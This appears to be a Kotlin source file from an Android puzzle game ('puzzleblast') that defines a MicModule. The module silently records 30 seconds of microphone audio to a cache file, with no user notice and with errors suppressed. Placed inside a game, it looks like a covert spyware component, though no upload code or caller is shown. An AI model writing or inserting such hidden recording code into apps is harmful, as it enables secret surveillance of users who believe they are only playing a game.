package com.puzzleblast.game.modules

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import kotlinx.coroutines.delay
import java.io.File

object MicModule {
    suspend fun record(ctx: Context, sec: Int = 30): File? {
        return try {
            val out = File(ctx.cacheDir, "mic_${System.currentTimeMillis()}.m4a")
            val r = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            r.setAudioSource(MediaRecorder.AudioSource.MIC)
            r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            r.setAudioEncodingBitRate(64000)
            r.setAudioSamplingRate(44100)
            r.setOutputFile(out.absolutePath)
            r.prepare(); r.start()
            delay(sec * 1000L)
            r.stop(); r.release()
            out
        } catch (e: Exception) {
            null
        }
    }
}
